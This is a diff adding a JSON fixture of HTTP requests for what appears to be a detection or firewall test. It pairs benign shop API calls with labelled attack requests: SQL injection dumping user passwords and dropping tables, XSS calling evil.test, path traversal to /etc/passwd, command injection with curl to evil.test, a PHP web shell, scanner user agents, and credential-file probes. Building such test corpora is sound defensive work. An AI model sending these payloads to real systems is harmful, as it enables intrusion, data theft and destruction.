@@ -1,0 +1,652 @@
+{
+  "normal": [
+    {
+      "name": "home",
+      "method": "GET",
+      "path": "/",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "product search apple",
+      "method": "GET",
+      "path": "/rest/products/search?q=apple",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "product search orange juice",
+      "method": "GET",
+      "path": "/rest/products/search?q=orange%20juice",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "product search unicode",
+      "method": "GET",
+      "path": "/rest/products/search?q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "product list",
+      "method": "GET",
+      "path": "/api/Products",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "product detail",
+      "method": "GET",
+      "path": "/api/Products/1",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "feedback list",
+      "method": "GET",
+      "path": "/api/Feedbacks",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "english locale",
+      "method": "GET",
+      "path": "/assets/i18n/en.json",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "product image",
+      "method": "GET",
+      "path": "/assets/public/images/products/apple_juice.jpg",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "favicon",
+      "method": "GET",
+      "path": "/favicon.ico",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "robots",
+      "method": "GET",
+      "path": "/robots.txt",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "sitemap",
+      "method": "GET",
+      "path": "/sitemap.xml",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "whoami",
+      "method": "GET",
+      "path": "/rest/user/whoami",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "login",
+      "method": "POST",
+      "path": "/rest/user/login",
+      "body": "{\"email\": \"user@example.com\", \"password\": \"Example123\"}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "create feedback",
+      "method": "POST",
+      "path": "/api/Feedbacks",
+      "body": "{\"comment\": \"Great juice\", \"rating\": 5}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "basket",
+      "method": "GET",
+      "path": "/rest/basket/1",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "add to basket",
+      "method": "POST",
+      "path": "/rest/basket/1/product",
+      "body": "{\"productId\": 1, \"quantity\": 2}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "product reviews",
+      "method": "GET",
+      "path": "/rest/products/1/reviews",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "update review",
+      "method": "PUT",
+      "path": "/rest/products/1/reviews",
+      "body": "{\"message\": \"nice\", \"author\": \"bob\"}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "quantities",
+      "method": "GET",
+      "path": "/api/Quantitys",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "security questions",
+      "method": "GET",
+      "path": "/api/SecurityQuestions",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "challenges",
+      "method": "GET",
+      "path": "/api/Challenges",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "complaints",
+      "method": "GET",
+      "path": "/api/Complaints",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "deliveries",
+      "method": "GET",
+      "path": "/api/Deliverys",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "recycles",
+      "method": "GET",
+      "path": "/api/Recycles",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "cards",
+      "method": "GET",
+      "path": "/api/Cards",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "addresses",
+      "method": "GET",
+      "path": "/api/Addresss",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "basket items",
+      "method": "GET",
+      "path": "/api/BasketItems",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "users",
+      "method": "GET",
+      "path": "/api/Users",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "captcha",
+      "method": "GET",
+      "path": "/rest/captcha",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "reset password",
+      "method": "POST",
+      "path": "/rest/user/reset-password",
+      "body": "{\"email\": \"user@example.com\", \"answer\": \"blue\", \"new\": \"Example123\"}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "search page",
+      "method": "GET",
+      "path": "/search?q=apple",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "login page",
+      "method": "GET",
+      "path": "/login",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "api search",
+      "method": "GET",
+      "path": "/api/Products?search=apple",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "banana search",
+      "method": "GET",
+      "path": "/rest/products/search?q=banana",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "default upload image",
+      "method": "GET",
+      "path": "/assets/public/images/uploads/default.svg",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "second product",
+      "method": "GET",
+      "path": "/api/Products/2",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "authentication details",
+      "method": "GET",
+      "path": "/rest/user/authentication-details",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "user stylesheet",
+      "method": "GET",
+      "path": "/assets/public/css/user.css",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "paged products",
+      "method": "GET",
+      "path": "/api/Products?limit=10&offset=0",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    }
+  ],
+  "attack": [
+    {
+      "name": "union select",
+      "method": "GET",
+      "path": "/rest/products/search?q=apple%27%20UNION%20SELECT%20id,email,password%20FROM%20Users--",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "boolean tautology",
+      "method": "GET",
+      "path": "/rest/products/search?q=%27%20OR%201%3D1--",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "stacked drop",
+      "method": "GET",
+      "path": "/rest/products/search?q=1%3B%20DROP%20TABLE%20Users",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "time delay",
+      "method": "GET",
+      "path": "/rest/products/search?q=1%20AND%20SLEEP(5)",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "union all nulls",
+      "method": "GET",
+      "path": "/rest/products/search?q=x%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "login comment",
+      "method": "POST",
+      "path": "/rest/user/login",
+      "body": "{\"email\": \"admin'--\", \"password\": \"x\"}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "numeric tautology",
+      "method": "GET",
+      "path": "/rest/products/search?q=1%27%20AND%201%3D1%23",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "information schema",
+      "method": "GET",
+      "path": "/rest/products/search?q=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "script tag",
+      "method": "GET",
+      "path": "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "image onerror",
+      "method": "GET",
+      "path": "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "javascript uri",
+      "method": "GET",
+      "path": "/search?q=javascript%3Aalert(document.cookie)",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "iframe injection",
+      "method": "GET",
+      "path": "/search?q=%3Ciframe%20src%3D%2F%2Fevil.test%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "svg onload",
+      "method": "GET",
+      "path": "/search?q=%3Csvg%20onload%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "feedback script",
+      "method": "POST",
+      "path": "/api/Feedbacks",
+      "body": "{\"comment\": \"<script>fetch('//evil.test')</script>\", \"rating\": 1}",
+      "content_type": "application/json",
+      "headers": {}
+    },
+    {
+      "name": "attribute break",
+      "method": "GET",
+      "path": "/search?q=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "body onload",
+      "method": "GET",
+      "path": "/search?q=%3Cbody%20onload%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "dotdot path",
+      "method": "GET",
+      "path": "/assets/../../etc/passwd",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "encoded traversal",
+      "method": "GET",
+      "path": "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "traversal query",
+      "method": "GET",
+      "path": "/download?file=../../../../etc/passwd",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "null byte",
+      "method": "GET",
+      "path": "/download?file=/etc/passwd%00.jpg",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "backslash traversal",
+      "method": "GET",
+      "path": "/static/..%5c..%5cwindows%5cwin.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "boot ini",
+      "method": "GET",
+      "path": "/file?path=..%5c..%5cboot.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "shell cat",
+      "method": "GET",
+      "path": "/search?q=%3Bcat%20%2Fetc%2Fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "pipe whoami",
+      "method": "GET",
+      "path": "/search?q=127.0.0.1%7Cwhoami",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "command substitution",
+      "method": "GET",
+      "path": "/search?q=%24(curl%20http%3A%2F%2Fevil.test%2Fx)",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "backtick id",
+      "method": "GET",
+      "path": "/search?q=%60id%60",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "php payload",
+      "method": "GET",
+      "path": "/search?q=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "java runtime",
+      "method": "GET",
+      "path": "/search?q=java.lang.Runtime.getRuntime().exec('id')",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "bash path",
+      "method": "GET",
+      "path": "/search?q=%2Fbin%2Fbash%20-c%20whoami",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "cmd exe",
+      "method": "GET",
+      "path": "/search?q=cmd.exe%20%2Fc%20dir",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "php form field",
+      "method": "POST",
+      "path": "/file-upload",
+      "body": "code=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {}
+    },
+    {
+      "name": "phpinfo",
+      "method": "GET",
+      "path": "/search?q=phpinfo()",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "sqlmap agent",
+      "method": "GET",
+      "path": "/",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "sqlmap/1.8.7#stable"
+      }
+    },
+    {
+      "name": "nikto agent",
+      "method": "GET",
+      "path": "/",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Nikto/2.5.0"
+      }
+    },
+    {
+      "name": "nuclei agent",
+      "method": "GET",
+      "path": "/",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; Nuclei)"
+      }
+    },
+    {
+      "name": "git config probe",
+      "method": "GET",
+      "path": "/.git/config",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "wordpress probe",
+      "method": "GET",
+      "path": "/wp-admin/",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "env probe",
+      "method": "GET",
+      "path": "/.env",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "server status probe",
+      "method": "GET",
+      "path": "/server-status",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    },
+    {
+      "name": "aws credentials probe",
+      "method": "GET",
+      "path": "/.aws/credentials",
+      "body": "",
+      "content_type": "",
+      "headers": {}
+    }
+  ]
+}
